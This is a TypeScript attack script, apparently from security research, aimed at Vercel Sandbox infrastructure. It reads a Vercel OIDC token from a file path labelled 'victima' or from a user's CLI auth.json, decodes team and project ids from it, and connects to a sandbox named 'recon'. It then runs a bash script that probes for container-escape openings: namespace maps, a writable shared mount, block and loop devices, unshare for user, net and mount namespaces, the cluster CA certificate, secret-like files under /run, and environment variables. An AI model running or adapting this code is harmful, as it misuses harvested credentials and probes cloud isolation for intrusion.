import { Sandbox } from "@vercel/sandbox";
import { readFileSync } from "fs";
function loadToken(): string {
  try {
    const t = readFileSync("/tmp/vercel-sandbox/victima/.env.local","utf8").match(/^VERCEL_OIDC_TOKEN=(.*)$/m)?.[1] ?? "";
    if (t) return t;
  } catch {}
  try {
    const t = readFileSync("/home/edwar/.local/share/com.vercel.cli/auth.json","utf8").match(/"token":\s*"([^"]+)"/)?.[1] ?? "";
    if (t) return t;
  } catch {}
  return "";
}
const VICTIM = loadToken();
let V: any; try { V = JSON.parse(Buffer.from(VICTIM.split(".")[1],"base64url").toString()); } catch { V = {}; }
const teamId = V.owner_id ?? "team_bi7zLiwN9ULZQklHh3rlmq7D";
const projectId = V.project_id ?? "prj_d78xOhTH7oD0Hs2MTmhpSgpPVc7A";

async function main() {
  const s = await Sandbox.get({ name: "recon-1787251919562", token: VICTIM, teamId, projectId });
  const SCRIPT = `
set +e
echo "===== uid_map / gid_map (userns) ====="
cat /proc/self/uid_map 2>/dev/null
cat /proc/self/gid_map 2>/dev/null
echo "===== userns depth / current ns ====="
readlink /proc/self/ns/user 2>/dev/null
echo "host userns would differ if chained"
echo "===== /run/vercel/share ====="
ls -la /run/vercel/ 2>/dev/null
ls -la /run/vercel/share/ 2>/dev/null | head -20
echo "===== can we write to /run/vercel/share? ====="
touch /run/vercel/share/test_write 2>&1 && echo "WRITE OK" && rm -f /run/vercel/share/test_write || echo "write blocked"
echo "===== blkid / lsblk ====="
lsblk 2>/dev/null
cat /proc/partitions 2>/dev/null
echo "===== vdb find mounted? ====="
mount 2>/dev/null | grep -E 'vdb|drives'
grep vdb /proc/self/mountinfo 2>/dev/null
echo "===== loop devices ====="
ls -la /dev/loop* 2>/dev/null | head -10
losetup -a 2>/dev/null
echo "===== tun/vsock present? ====="
ls -la /dev/net/tun /dev/vsock 2>&1
echo "===== try create netns / userns (unprivileged) ====="
unshare -Urn true 2>&1 && echo "USERNS+NETNS OK" || echo "userns blocked"
unshare -m true 2>&1 && echo "MOUNTNS OK" || echo "mountns blocked"
echo "===== try cap_sys_admin check via setns? no - just verify mount on /run/vercel/share is writable from mountns ==="
echo "===== CA cert content ====="
cat /run/cell/ca-cert.pem 2>&1 | head -3
echo "===== find secrets-ish files in /run ====="
find /run -maxdepth 3 -type f 2>/dev/null | head -20
echo "===== env ====="
env | grep -iv 'path\|home\|shell\|lang\|term\|pwd' | head -10
echo "===== DONE ====="
`;
  const r = await s.runCommand("bash", ["-c", SCRIPT], { wait: true, timeout: 40_000 });
  console.log(await r.output("both"));
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });